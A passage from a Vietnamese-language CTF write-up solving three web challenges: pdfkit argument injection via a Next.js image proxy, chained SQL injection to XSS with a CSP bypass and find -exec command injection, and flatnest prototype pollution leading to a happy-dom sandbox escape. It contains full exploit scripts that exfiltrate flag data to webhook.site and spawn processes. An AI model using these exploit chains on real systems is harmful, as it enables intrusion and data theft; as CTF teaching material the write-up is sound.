</code></pre><ul><li>Chúng ta sẽ chèn vào header <code>Content-Disposition</code> bới nó sẽ được đưa vào pdfkit lúc sau</li></ul><h2 class="relative group">pdfkit Argument Injection (The Flag Exfiltration)<div id=pdfkit-argument-injection-the-flag-exfiltration class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#pdfkit-argument-injection-the-flag-exfiltration aria-label=Anchor>#</a></span></h2><ul><li><p>pdfkit là tool để chuyển từ HTML sang pdf</p></li><li><p>Chúng ta có thể inject vào 1 đoạn html để lợi dụng 1 số chức năng để đọc flag<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/rkmt4UuU-l.png></figure></p></li><li><p>Như vậy payload sẽ như sau :</p></li></ul><pre tabindex=0><code class="language-code=" data-lang="code=">&lt;meta name=&#34;pdfkit-post-file&#34; content=&#34;&#34;&gt;
&lt;meta name=&#34;pdfkit-leak-data&#34; content=&#34;/flag&#34;&gt;
&lt;meta name=&#34;pdfkit-https://webhook.site/XXXX/&#34; content=&#34;--cache-dir&#34;&gt;
</code></pre><ul><li>Payload sẽ được hình dung như sau :<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/S1HmdI_IWx.png></figure></li><li>Double encode url ta được payload ⬇️</li></ul><h2 class="relative group">Final exploit<div id=final-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#final-exploit aria-label=Anchor>#</a></span></h2><pre tabindex=0><code class="language-code=" data-lang="code=">import requests
import time

paylaod = &#34;http%3A%2F%2F7f000001.8efac8ce.rbndr.us%3A5000%2Fgenerate%3Fdata%3Ddata%3Aplain%2Ftext%250AContent-Disposition%3A%253Cmeta%2520name%3D%2522pdfkit-post-file%2522%2520content%3D%2522%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-leak-data%2522%2520content%3D%2522%2Fflag%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-https%3A%2F%2Fwebhook.site%2F1738ce87-4a08-47ae-9cd5-323dc449cb7d%2F%3Fq%3D--%2522%2520content%3D%2522--cache-dir%2522%253E%2Ccanelo&#34;

r =  f&#34;http://165.227.157.69/_next/image?url={paylaod}&amp;w=256&amp;q=75&amp;&#34;

print(&#34;Attack started check your webhook&#34;)

while True:
    _ = requests.get(r)
    time.sleep(0.1)
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/SkZfrUOUbl.png></figure></p><ul><li>LƯU Ý : chall này không thực hiện được trên local bới đặc tính của NextJS
<strong>FLAG : 0xL4ugh{my_pdfs_are_something_else_right?_179453d559cb1bec}</strong></li></ul><h1 class="relative group">Smol Web<div id=smol-web class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#smol-web aria-label=Anchor>#</a></span></h1><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/SyeNttP8bx.png></figure><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/r1nQ0FvLWl.png></figure></p><h2 class="relative group">Phân tích<div id=phân-tích class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#ph%c3%a2n-t%c3%adch aria-label=Anchor>#</a></span></h2><ul><li>web service (port 5000): xem và đánh giá sản phẩm</li><li>bot service (port 3000): admin bot sử dụng puppeteer để visit URL được report</li></ul><h3 class="relative group"><code>app/Dockerfile</code><div id=appdockerfile class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#appdockerfile aria-label=Anchor>#</a></span></h3><ul><li>Flag nằm trong biến môi trường, chỉ có thể đọc qua binary <code>/readflagbinary</code> (được set quyền SUID) => RCE</li></ul><h3 class="relative group"><code>app/main.py</code><div id=appmainpy class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#appmainpy aria-label=Anchor>#</a></span></h3><ul><li><p>endpoint <code>/ratings</code> lấy tham số <code>quantity</code> và đưa trực tiếp vào lệnh SQL qua <code>f-string</code><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/H1PEk5v8Wg.png></figure></p></li><li><p>Có filet <code>'</code> và <code>"</code> nhưng vì đây là interger nên không cần dấu nháy để injection</p></li><li><p>Sau khi query bảng <code>products</code> code lấy <code>user_id</code> từ kết quả để query bảng <code>users</code><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/HkmQxqD8-x.png></figure></p></li><li><p><code>r['user_id']</code> là dữ liệu ta control được từ câu query trên</p></li><li><p>Tại <code>templates/ratings_page.html</code> creator được render với filter <code>safe</code>:<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/BkN_x9PI-x.png></figure></p></li></ul><p>=> Chain: inject payload vào cột <code>user_id</code> ở query 1 -> payload đó trở thành câu SQL query 2 -> trả về XSS payload vào biến <code>name</code> -> render ra HTML</p><h3 class="relative group">Endpoint /search (chỉ access được từ localhost (từ phía bot)<div id=endpoint-search-chỉ-access-được-từ-localhost-từ-phía-bot class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#endpoint-search-ch%e1%bb%89-access-%c4%91%c6%b0%e1%bb%a3c-t%e1%bb%ab-localhost-t%e1%bb%ab-ph%c3%ada-bot aria-label=Anchor>#</a></span></h3><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/SkgxZcwLWx.png></figure></p><ul><li>Hàm <code>sanitize_input</code> chặn nhiều ký tự và các lệnh<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/ryxSbcwIWe.png></figure></li><li>Nhưng <code>find</code> command có tuỳ chọn <code>-exec</code> => cần bypass filter để chạy <code>/readflagbinary</code></li></ul><h2 class="relative group">Vuln<div id=vuln class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#vuln aria-label=Anchor>#</a></span></h2><ol><li><strong>SQL Injection (stage 1)</strong>: inject còn <code>quantity</code> để control cột <code>user_id</code> trả về</li><li><strong>SQLi (stage 2)</strong>: sử dụng giá trị <code>user_id</code> độc hại để Union Select ra payload XSS</li><li><strong>Reflected XSS</strong>: payload XSS hiển trị trên trang <code>/ratings</code></li><li><strong>CSP bypass</strong> sử dụng JSONP endpoint của youtube (<code>/oembed</code>) để execute JS</li><li><strong>SSRF/local access</strong>: dùng bot để trigger request tới <code>/search</code> (endpoint nội bộ)</li><li><strong>Command Injection</strong>: inject tham số cho lẹnh <code>find</code> để thực thi <code>/readflagbinary</code></li></ol><h2 class="relative group">Exploit<div id=exploit-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#exploit-1 aria-label=Anchor>#</a></span></h2><h3 class="relative group">Bypass filter và payload encoding<div id=bypass-filter-và-payload-encoding class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#bypass-filter-v%c3%a0-payload-encoding aria-label=Anchor>#</a></span></h3><ul><li>Do <code>quantity</code> chặn dấu nháy <code>'</code> nên không thể viết string trực tiếp => Dùng hàm <code>CHAR(ascii_code)</code> của SQLite và nối chuỗi bằng <code>||</code></li></ul><h3 class="relative group">Tạo payload XSS để bypass CSP<div id=tạo-payload-xss-để-bypass-csp class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#t%e1%ba%a1o-payload-xss-%c4%91%e1%bb%83-bypass-csp aria-label=Anchor>#</a></span></h3><ul><li>không thể dùng <code>&lt;script>alert(1)&lt;/script></code> => dùng gadget youtube
<code>&lt;script src="https://www.youtube.com/oembed?callback=...Javascript...">&lt;/script></code></li><li>Đoạn JS trong callback sẽ:<ul><li>Tạo <code>XMLHttpRequest</code> POST tới <code>/search</code></li><li>Gửi body: <code>search=-exec /*e*b*y ;</code></li><li>Đọc response (output của lệnh <code>find</code>)</li><li>Gửi flag về webhook qua <code>location</code></li></ul></li></ul><h3 class="relative group">Bypass filter tại <code>/search</code><div id=bypass-filter-tại-search class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#bypass-filter-t%e1%ba%a1i-search aria-label=Anchor>#</a></span></h3><ul><li>Lệnh cần chạy: <code>/readflagbinary</code>. Filter block: <code>r, l, f, a, d...</code> . Filter allow: <code>e, b, y, *, /</code> Payload: <code>/*e*b*y</code><ul><li><code>/</code> : Root</li><li><code>*</code> : match <code>readflag</code></li><li><code>b</code> : match <code>b</code></li><li><code>*</code> : match <code>inar</code></li><li><code>y</code> : match <code>y</code> => find sẽ execute: <code>/readflagbinary</code></li></ul></li></ul><h3 class="relative group">Chain SQLi<div id=chain-sqli class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#chain-sqli aria-label=Anchor>#</a></span></h3><ul><li><p>Ta cần nhúng XSS payload vào <code>user_name</code></p><ul><li>query 2 (inner): <code>0 UNION SELECT 1, '&lt;script...XSS...>'</code></li><li>query 1 (outer): <code>quantity = 0 UNION SELECT 1, 2, 3, (payload query 2 đã encode CHAR)</code></li></ul></li><li><p>Khi server chạy:</p><ul><li>query 1 trả về <code>user_id</code> là chuỗi SQL <code>"0 UNION SELECT..."</code></li><li>query 2 chạy: <code>SELECT ... WHERE id = 0 UNION SELECT 1, '&lt;script...>'</code></li><li>User name là đoạn script</li><li>HTML render đoạn script -> Bot chạy script -> RCE -> Lấy Flag</li></ul></li></ul><h2 class="relative group">Full script:<div id=full-script class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#full-script aria-label=Anchor>#</a></span></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> urllib.parse
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># [CONFIG] Thay đổi URL target và Webhook của bạn</span>
</span></span><span style=display:flex><span>TARGET_URL <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://challenges2.ctf.sd:35129&#34;</span>
</span></span><span style=display:flex><span>WEBHOOK <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://webhook.site/0c04e078-b97c-4c59-82a9-fc5f06f2eea8&#34;</span> <span style=color:#75715e># Thay bằng webhook của bạn</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>to_char</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Chuyển đổi string sang dạng SQLite CHAR() để bypass filter dấu nháy (&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Ví dụ: &#39;ABC&#39; -&gt; CHAR(65,66,67)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    chars <span style=color:#f92672>=</span> [str(ord(c)) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> s]
</span></span><span style=display:flex><span>    chunks <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#75715e># Chia nhỏ để tránh giới hạn tham số nếu có</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(chars), <span style=color:#ae81ff>40</span>):
</span></span><span style=display:flex><span>        chunk <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;,&#34;</span><span style=color:#f92672>.</span>join(chars[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>40</span>])
</span></span><span style=display:flex><span>        chunks<span style=color:#f92672>.</span>append(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;CHAR(</span><span style=color:#e6db74>{</span>chunk<span style=color:#e6db74>}</span><span style=color:#e6db74>)&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;||&#34;</span><span style=color:#f92672>.</span>join(chunks)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>generate_payload</span>():
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Generating Exploit Payload...&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 1. Javascript Payload: Chạy trên browser của Bot</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Nhiệm vụ: POST vào /search để kích hoạt Command Injection, sau đó gửi kết quả về Webhook</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Payload cmd injection: -exec /*e*b*y ;  (Tương đương: -exec /readflagbinary ;)</span>
</span></span><span style=display:flex><span>    js_code <span style=color:#f92672>=</span> (
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;var xhr=new XMLHttpRequest();&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;xhr.open(&#39;POST&#39;,&#39;/search&#39;,true);&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;xhr.setRequestHeader(&#39;Content-Type&#39;,&#39;application/x-www-form-urlencoded&#39;);&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;xhr.onload=function(){&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;var d=new DOMParser().parseFromString(xhr.responseText,&#39;text/html&#39;);&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;var output=d.querySelector(&#39;pre&#39;).textContent;&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;location=&#39;&#34;</span> <span style=color:#f92672>+</span> WEBHOOK <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?flag=&#39;+btoa(output)&#34;</span> 
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;};&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;xhr.send(&#39;search=-exec /*e*b*y ;&#39;);&#34;</span>
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Encode JS để nhúng vào callback của Youtube</span>
</span></span><span style=display:flex><span>    encoded_js <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>quote(js_code)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># 2. XSS Payload: Bypass CSP bằng Youtube Oembed</span>
</span></span><span style=display:flex><span>    xss_tag <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;&lt;script src=&#34;https://www.youtube.com/oembed?callback=</span><span style=color:#e6db74>{</span>encoded_js<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;&gt;&lt;/script&gt;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 3. Inner SQL Injection (Query 2): Để inject XSS vào tên user</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Cấu trúc: 0 UNION SELECT 1, &#39;PAYLOAD_XSS&#39;</span>
</span></span><span style=display:flex><span>    inner_sqli <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;0 UNION SELECT 1,&#39;</span><span style=color:#e6db74>{</span>xss_tag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;&#34;</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Encode Inner SQLi sang CHAR() để tránh dấu nháy trong Outer SQLi</span>
</span></span><span style=display:flex><span>    char_payload <span style=color:#f92672>=</span> to_char(inner_sqli)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># 4. Outer SQL Injection (Query 1): Inject vào tham số quantity</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Cột thứ 4 là user_id, ta nhét payload inner vào đây</span>
</span></span><span style=display:flex><span>    final_sqli <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;0 UNION SELECT 1,2,3,</span><span style=color:#e6db74>{</span>char_payload<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] Final Payload (for quantity param):</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>{</span>final_sqli<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> final_sqli
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>send_exploit</span>(payload):
</span></span><span style=display:flex><span>    <span style=color:#75715e># Đường dẫn mà Bot sẽ visit. </span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Bot sẽ truy cập: http://web:5000/ratings?quantity=...</span>
</span></span><span style=display:flex><span>    path_to_visit <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;/ratings?quantity=</span><span style=color:#e6db74>{</span>urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>quote(payload)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    report_url <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>TARGET_URL<span style=color:#e6db74>}</span><span style=color:#e6db74>/report&#34;</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[*] Sending report to: </span><span style=color:#e6db74>{</span>report_url<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[*] Bot will visit: </span><span style=color:#e6db74>{</span>path_to_visit<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(report_url, data<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;url&#34;</span>: path_to_visit})
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;[+] Report sent successfully! Check your webhook.&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[&gt;] Webhook URL: </span><span style=color:#e6db74>{</span>WEBHOOK<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[-] Failed to send report. Status: </span><span style=color:#e6db74>{</span>r<span style=color:#f92672>.</span>status_code<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            print(r<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[!] Error: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> generate_payload()
</span></span><span style=display:flex><span>    send_exploit(payload)
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/Bkzjv9wLWe.png></figure><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/BywsPcvIbl.png></figure></p><h1 class="relative group">4llD4y<div id=4lld4y class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#4lld4y aria-label=Anchor>#</a></span></h1><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/rJFMR4_IZg.png></figure><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/rydEC4OUWx.png></figure></p><h2 class="relative group">Phân tích<div id=phân-tích-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#ph%c3%a2n-t%c3%adch-1 aria-label=Anchor>#</a></span></h2><ul><li>Flag được ghi vào một file có tên <code>/flag_xxxxx.txt</code> (nằm ở root <code>/</code>)</li><li>biến môi trường <code>$FLAG</code> bị unset -> RCE để list file trong <code>/</code> và đọc</li></ul><h3 class="relative group">app.js<div id=appjs class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#appjs aria-label=Anchor>#</a></span></h3><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/HyCx1H_8-e.png></figure></p><ul><li>Sử dụng <code>express</code> và <code>happy-dom</code></li><li>endpoint <code>/config</code> (POST)<ul><li>Nhận JSON input</li><li>sử dụng thư viện <code>flatnest</code> hàm <code>nest()</code> để xử lý object đầu vào</li></ul></li><li>endpoint <code>/render</code> (POST)<ul><li>nhận <code>html</code> string</li><li>khởi tạo <code>new Window()</code> từ <code>happy-dom</code></li><li>ghi HTML vào document và trả về <code>outerHTML</code>
=> Nơi ta execute XSS/JS nhưng mặc định <code>happy-dom</code> sẽ tắt execute JS</li></ul></li></ul><h2 class="relative group">Vuln<div id=vuln-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#vuln-1 aria-label=Anchor>#</a></span></h2><p><strong>1. prototype pollution trong flasnest (CVE-2023-26135)</strong></p><ul><li><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/Hkx1lBuLWe.png></figure></li><li>Thư viện <code>flatnest</code> (v1.0.1) unflatten một object (chuyển key dạng dot-notation <code>x.y</code> thành nested object <code>{x: {y: ...}}</code>)</li><li>Nhưng nó không lọc các key như <code>__proto</code>, <code>constructor</code>, <code>prototype</code></li><li>Các payload kiểu cũ <code>{"__proto__": {"settings": ...}}</code> -> fail vì <code>flatnest</code> sẽ lọc key này</li><li><code>flatnest</code> có một tính năng đặc biệt để hỗ trợ Circular References -> cho phép định nghĩa một chuỗi đặc biệt để trỏ ngược lại object cha
(<a href=https://github.com/brycebaril/node-flatnest/blob/b7d97ec64a04632378db87fcf3577bd51ac3ee39/nest.js target=_blank>có tham tham khảo ở đây</a>)</li><li><code>flatnest</code> parse chuỗi có định dạng <code>[Circular (path)]</code></li><li>nó không validate <code>path</code> bên trong <code>Circular</code></li><li>khi ta gửi <code>"[Circular (__proto__)]"</code> <code>flatnest</code> sẽ phân giải nó và trỏ thẳng vào <code>Object.prototype</code> của object hiện tại mà không bị filter key chặn
<strong>2. sandbox escapse/RCE trong happy-dom</strong></li><li>khi <code>enableJavaScriptEvaluation</code> được bật -> tag <code>script</code> trong HTML gửi lên sẽ được execute</li><li>Vì chạy trong cùng context với note process nên ta có thể dùng <code>this.constructor.constructor</code> để lấy <code>Function</code> constructor gốc -> gọi ra <code>process</code> của nodejs và rce</li></ul><h2 class="relative group">Exploit<div id=exploit-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#exploit-2 aria-label=Anchor>#</a></span></h2><h3 class="relative group">prototype pollution<div id=prototype-pollution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#prototype-pollution aria-label=Anchor>#</a></span></h3><ul><li>Dùng <code>nest()</code> tại <code>/config</code> để pollution <code>Object.prototype.settings</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;polluter&#34;</span>: <span style=color:#e6db74>&#34;[Circular (__proto__)]&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;polluter.settings&#34;</span>: {},
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;polluter.settings.enableJavaScriptEvaluation&#34;</span>: <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ul><li><code>flatnest</code> gán <code>obj.polluter = obj.__proto__</code> (tức là <code>Object.prototype</code>)</li><li>Nó gán <code>obj.polluter.settings.enableJavaScriptEvaluation = true</code>
&lt;=> <code>Object.prototype.settings = { enableJavaScriptEvaluation: true }</code></li></ul><h3 class="relative group">RCE<div id=rce class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#rce aria-label=Anchor>#</a></span></h3><h4 class="relative group">sandbox escapse<div id=sandbox-escapse class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#sandbox-escapse aria-label=Anchor>#</a></span></h4><ul><li>sau khi pollute và trả về <code>{ message: 'configuration applied' }</code></li><li><code>happy-dom</code> sử dụng <code>vm</code> module của node.js để chạy script trong tag <code>&lt;script></code></li><li><code>vm</code> không phải là security sandbox. Context bên trong <code>vm</code> vẫn có thể truy cập vào constructor của các object cơ bản ( <code>Object</code>, <code>Function</code>)</li><li>ta dùng <code>this.constructor.constructor</code> (trong đó <code>this</code> là window/global scope của VM) sẽ trả về <code>Function</code> constructor của host process (node.js chính) cho phép ta thoát khỏi VM context và execute code</li></ul><h4 class="relative group">internal binding<div id=internal-binding class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#internal-binding aria-label=Anchor>#</a></span></h4><ul><li><code>process.binding('spawn_sync')</code> là internal API của node.js được dùng bởi <code>child_process</code>. Dùng cái này để bypass nếu module <code>child_process</code> bị override hoặc filter, và nó khá ổn để spawn process con (như <code>/bin/ls</code> hay <code>/bin/cat</code>) trực tiếp</li></ul><pre tabindex=0><code class=language-javascript! data-lang=javascript!>// thoát sandbox, lấy object process của node.js
const process = this.constructor.constructor(&#34;return process&#34;)();

// lấy internal binding để spawn process
const spawn = process.binding(&#34;spawn_sync&#34;);

// Cấu hình lệnh
const opts = {
    file: &#34;/bin/ls&#34;,
    args: [&#34;ls&#34;, &#34;/&#34;],
    envPairs: [],
    stdio: [
        {type:&#34;pipe&#34;,readable:true,writable:false},
        {type:&#34;pipe&#34;,readable:false,writable:true},
        {type:&#34;pipe&#34;,readable:false,writable:true}
    ]
};

// excecute và lấy output
const result = spawn.spawn(opts);

